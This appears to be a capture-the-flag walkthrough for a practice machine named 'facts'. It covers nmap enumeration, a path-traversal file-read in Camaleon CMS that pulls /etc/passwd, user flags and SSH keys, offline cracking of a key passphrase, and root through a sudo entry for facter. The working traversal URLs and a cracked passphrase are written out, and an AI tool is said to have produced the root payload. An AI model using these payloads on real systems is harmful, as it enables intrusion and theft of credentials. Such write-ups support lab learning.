![[Pasted image 20260202101936.png]]

# Enumeration

I ran the nmap command
```
sudo nmap -sC -sV -vv -oA facts facts.htb
```

Got the following output:
```
# Nmap 7.98 scan initiated Sat Jan 31 14:36:09 2026 as: /usr/lib/nmap/nmap -sC -sV -vv -oA facts facts.htb
Nmap scan report for facts.htb (10.129.103.254)
Host is up, received echo-reply ttl 63 (0.33s latency).
Scanned at 2026-01-31 14:36:10 EST for 16s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
80/tcp open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
|_http-title: facts
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 8C83ADFFE48BE12C38E7DBCC2D0524BC
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 31 14:36:26 2026 -- 1 IP address (1 host up) scanned in 16.96 seconds
```

2 ports open
22, which has SSH, and the banner tells us its an Ubuntu server
80, which has http running nginx 1.26.3

![[Pasted image 20260202102942.png]]

This is what we see when we open the website
 
After directory fuzzing, we find there is an `/admin` page which redirects us to `/admin/login` page
After registering an account on `/admin/register`, I logged in and we come upon an admin panel

The admin panel tells us that this is `Camaleon CMS` running version `2.9.0`

After searching up an exploit, we find a `LFI` vulnerablity
https://rubysec.com/advisories/CVE-2024-46987/

I used the following payload for confirmation
```
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

Here is output:
![[Pasted image 20260202103551.png]]

We have 3 non-root users on this machine, `trivia, william and _laurel`

I used the following payload and got the user flag through an unintended way:
```
GET /admin/media/download_private_file?file=../../../../../../home/william/user.txt
```

![[Pasted image 20260202103732.png]]

# Foothold

I tried getting the SSH keys of trivia, william and Laurel
Only trivia's SSH keys were retrievable

![[{9D653AE8-B8B4-4145-9F6C-FE402D49D54B}.png]]

I cracked Trivia's private SSH key using ssh2john and found that the passsword was `dragonballz`

Using that, I was able to SSH in and get the foothold

![[Pasted image 20260202104038.png]]

# Privilege Escalation

```
trivia@facts:~$ sudo -l Matching Defaults entries for trivia on facts: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty User trivia may run the following commands on facts: (ALL) NOPASSWD: /usr/bin/facter
```

I used a clanker to make this payload
![[Pasted image 20260202104405.png]]

By executing this, I got reverse shell as root and got the root flag

